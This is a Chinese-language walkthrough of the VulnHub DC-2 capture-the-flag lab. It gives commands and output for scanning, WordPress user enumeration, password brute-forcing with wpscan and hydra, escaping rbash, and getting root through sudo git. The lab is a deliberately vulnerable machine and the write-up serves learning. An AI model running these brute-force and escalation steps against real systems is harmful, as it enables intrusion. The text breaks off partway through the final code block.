    <content type="html"><![CDATA[<h1 id="0x05-DC-2-vulnhub"><a href="#0x05-DC-2-vulnhub" class="headerlink" title="0x05 DC: 2~vulnhub"></a>0x05 DC: 2~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-2,311/">DC: 2 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.148</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:23 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.011s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00018s latency).<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0020s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.62 seconds<br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.148</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>简单的端口扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.148</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:23 EDT<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0010s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7744/tcp open  raqmon-pdu<br>MAC Address: 00:0C:29:3D:C0:33 (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 4.23 seconds<br></code></pre></td></tr></table></figure><p><strong>全面扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.148</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 09:27 EDT<br>Nmap scan report for 192.168.135.148<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Did not follow redirect to http://dc-2/<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)<br>|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)<br>|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)<br>|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 16.16 seconds<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.10 ((Debian))</td></tr><tr><td>7744/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>7744端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p><p><strong>80端口</strong></p><p>访问 <code>http://192.168.135.148</code> ，发现无法访问且重定向到了 <code>http://dc-2/</code> ，这样的话我们添加一条映射：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>                                                                                             <br>127.0.0.1       localhost<br>127.0.1.1       kali<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo vi /etc/hosts</span>   <br><span class="hljs-meta">#</span><span class="bash"> 添加: 192.168.135.148 dc-2</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br>192.168.135.148 dc-2<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br></code></pre></td></tr></table></figure><p>这样就可以正常访问了。</p><p>进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://dc-2</span>                                                    <br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sun Jun 26 21:05:39 2022<br>URL_BASE: http://dc-2/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://dc-2/ ----<br>+ http://dc-2/index.php (CODE:301|SIZE:0)<br>+ http://dc-2/server-status (CODE:403|SIZE:292)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/<br>==&gt; DIRECTORY: http://dc-2/wp-content/<br>==&gt; DIRECTORY: http://dc-2/wp-includes/<br>+ http://dc-2/xmlrpc.php (CODE:405|SIZE:42)<br><br>---- Entering directory: http://dc-2/wp-admin/ ----<br>+ http://dc-2/wp-admin/admin.php (CODE:302|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/css/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/images/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/includes/<br>+ http://dc-2/wp-admin/index.php (CODE:302|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-admin/js/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/maint/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/network/<br>==&gt; DIRECTORY: http://dc-2/wp-admin/user/<br><br>---- Entering directory: http://dc-2/wp-content/ ----<br>+ http://dc-2/wp-content/index.php (CODE:200|SIZE:0)<br>==&gt; DIRECTORY: http://dc-2/wp-content/languages/<br>==&gt; DIRECTORY: http://dc-2/wp-content/plugins/<br>==&gt; DIRECTORY: http://dc-2/wp-content/themes/<br><br>---- Entering directory: http://dc-2/wp-admin/network/ ----<br>+ http://dc-2/wp-admin/network/admin.php (CODE:302|SIZE:0)<br>+ http://dc-2/wp-admin/network/index.php (CODE:302|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-admin/user/ ----<br>+ http://dc-2/wp-admin/user/admin.php (CODE:302|SIZE:0)<br>+ http://dc-2/wp-admin/user/index.php (CODE:302|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-content/plugins/ ----<br>+ http://dc-2/wp-content/plugins/index.php (CODE:200|SIZE:0)<br><br>---- Entering directory: http://dc-2/wp-content/themes/ ----<br>+ http://dc-2/wp-content/themes/index.php (CODE:200|SIZE:0)<br><br>-----------------<br>END_TIME: Sun Jun 26 21:06:32 2022<br>DOWNLOADED: 32284 - FOUND: 12<br></code></pre></td></tr></table></figure><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>访问 <code>http://dc-2</code> ，得到一些提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> http://dc-2</span><br>DC-2<br>Just another WordPress site<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> http://dc-2/index.php/flag/</span><br>Flag 1:<br>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.<br>More passwords is always better, but sometimes you just can’t win them all.<br>Log in as one to see the next flag.<br>If you can’t find it, log in as another.<br></code></pre></td></tr></table></figure><p>扫描 WordPress 用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://dc-2 --enumerate u</span>  <br>[+] URL: http://dc-2/ [192.168.135.148]<br>[+] Started: Sun Jun 26 21:26:57 2022<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://dc-2/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br><br>[+] WordPress theme in use: twentyseventeen<br> | Location: http://dc-2/wp-content/themes/twentyseventeen/<br> | Last Updated: 2022-05-24T00:00:00.000Z<br> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of date, the latest version is 3.0<br> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;Version: 1.2&#x27;<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:01 &lt;=========================================================================&gt; (10 / 10) 100.00% Time: 00:00:01<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] jerry<br> | Found By: Wp Json Api (Aggressive Detection)<br> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> | Confirmed By:<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] tom<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br></code></pre></td></tr></table></figure><p>使用 cewl 对站点生成字典：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://dc-2 -w passwd.txt</span><br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin\njerry\ntom&quot;</span> &gt; user.txt</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>                  <br>admin<br>jerry<br>tom<br></code></pre></td></tr></table></figure><p>使用 wpscan 进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://dc-2 -U user.txt -P passwd.txt</span><br>[+] URL: http://dc-2/ [192.168.135.148]<br>[+] Performing password attack on Xmlrpc against 3 user/s<br>[SUCCESS] - jerry / adipiscing<br>[SUCCESS] - tom / parturient<br>Trying admin / log Time: 00:01:59 &lt;=============&gt; (646 / 1121) 57.62%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient<br></code></pre></td></tr></table></figure><p>通过查找得到登录页面：<code>http://dc-2/wp-admin ===&gt; http://dc-2/wp-login.php</code> 。</p><p>使用 <code>Username: jerry, Password: adipiscing</code> 登录，在 <code>Pages</code> 中发现 <code>flag2</code> ：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">Flag <span class="hljs-number">2</span>:<br><span class="hljs-keyword">If</span> you can<span class="hljs-symbol">&#x27;t</span> exploit WordPress <span class="hljs-keyword">and</span> take a shortcut, there <span class="hljs-keyword">is</span> another way.<br>Hope you found another <span class="hljs-keyword">entry</span> point.<br></code></pre></td></tr></table></figure><p>使用得到的用户和密码 <code>Username: tom, Password: parturient</code> 尝试 SSH 登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh tom@192.168.135.148 -p 7744</span><br>tom@192.168.135.148&#x27;s password: <br>......<br>Last login: Sun Jun 26 19:25:52 2022 from 192.168.135.141<br>tom@DC-2:~$ ls<br>flag3.txt  usr<br>tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br>tom@DC-2:~$ ls usr/bin<br>less ls scp vi<br>tom@DC-2:~$ vi flag3.txt<br><span class="hljs-meta">#</span><span class="bash"> Poor old Tom is always running after Jerry. Perhaps he should su <span class="hljs-keyword">for</span> all the stress he causes.</span><br></code></pre></td></tr></table></figure><p>得到 flag3，根据提示进行进一步提权。</p><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="1、绕-rbash"><a href="#1、绕-rbash" class="headerlink" title="1、绕 rbash"></a>1、绕 rbash</h3><blockquote><p><a href="https://xz.aliyun.com/t/7642#toc-0">rbash逃逸大全 - 先知社区 (aliyun.com)</a></p></blockquote><p>发现 tom 使用 rbash，shell 被限制了，功能特别少，很多命令无法使用，所以要绕过 rbash 。</p><blockquote><p>restricted shell 是一种只能使用部分命令的 shell ；它为 Linux 中的 shell 提供了一个额外的安全层</p><p>rbash（The restricted mode of bash）为限制型 bash；是 restricted shell 的一种（rbash、ksh、rsh等）</p></blockquote><p><strong>方法一：通过 vi 提升 Shell 权限</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> vi</span><br><span class="hljs-meta">#</span><span class="bash"> 进入底行模式</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">set</span> shell=/bin/sh</span><br><span class="hljs-meta">#</span><span class="bash"> shell</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/</span><br><br>tom@DC-2:~$ vi<br><span class="hljs-meta">#</span><span class="bash"> :<span class="hljs-built_in">set</span> shell=/bin/bash    回车</span><br><span class="hljs-meta">#</span><span class="bash"> :shell    回车</span><br><br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure><p><strong>方法二：通过 BASH_CMDS 提升 Shell 权限</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> BASH_CMDS[a]=/bin/sh;a</span><br><span class="hljs-meta">#</span><span class="bash"> /bin/bash</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin/</span><br><br>tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br>tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a<br><span class="hljs-meta">$</span><span class="bash"> /bin/bash</span><br>tom@DC-2:~$ cat flag3.txt<br>bash: cat: command not found<br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure><p>根据提示，在 <code>/home/jerry</code> 下找到 flag4：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ ls /home/jerry<br>flag4.txt<br>tom@DC-2:~$ cat /home/jerry/flag4.txt<br>Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. <br>You still need to get the final flag (the only flag that really counts!!!).  <br>No hints here - you&#x27;re on your own now.  :-)<br>Go on - git outta here!!!!<br></code></pre></td></tr></table></figure><h3 id="2、git-提权"><a href="#2、git-提权" class="headerlink" title="2、git 提权"></a>2、git 提权</h3><blockquote><p><a href="https://gtfobins.github.io/">GTFOBins</a></p></blockquote><p>尽管对 tom 的 shell 进行了绕过，但有些命令还是没有，加上提示中出现 Jerry，尝试切换到 Jerry 用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ su jerry<br>Password: <br>jerry@DC-2:/home/tom$ id<br>uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)<br>jerry@DC-2:/home/tom$ sudo -l<br>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git<br>jerry@DC-2:/home/tom$ <br><br></code></pre></td></tr></table></figure><p>前面有提示 git ，加上可以使用 sudo 以 root 运行  git ，使用 git 进行提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">jerry@DC-2:/home/tom$ sudo git -p help config<br>NAME<br>       git-config - Get and set repository or global options<br>......<br><br>!/bin/sh<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">#</span><span class="bash"> </span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>final-flag.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/final-flag.txt</span><br> __    __     _ _       _                    _ <br>/ / /\ \ \___| | |   __| | ___  _ __   ___  / \<br>\ \/  \/ / _ \ | |  / _` |/ _ \| &#x27;_ \ / _ \/  /<br> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ <br>  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   <br><br><br>Congratulatons!!!<br><br>A special thanks to all those who sent me tweets<br>and provided me with feedback - it&#x27;s all greatly<br>appreciated.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、WordPress</p><p>2、wpscan：枚举用户名、爆破</p><p>3、cewl：根据站点生成密码字典</p><p>4、SSH</p><p>5、受限 Shell 的绕过，shell 提权</p><p>6、git 提权</p><h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>使用 hydra 进行爆破：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P passwd.txt dc-2 http-form-post <span class="hljs-string">&#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log&amp;testcookie=1:S=LOcation&#x27;</span></span><br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3/p:238), ~45 tries per task<br>[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log&amp;testcookie=1:S=LOcation<br>[80][http-post-form] host: dc-2   login: jerry   password: adipiscing<br>[80][http-post-form] host: dc-2   login: tom   password: parturient<br>1 of 1 target successfully completed, 2 valid passwords found<br></code></pre></td></tr></table></figure><p>表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--http://dc-2/wp-admin ===&gt; http://dc-2/wp-login.php--&gt;</span><br><br><span class="hljs-tag">&lt;<span 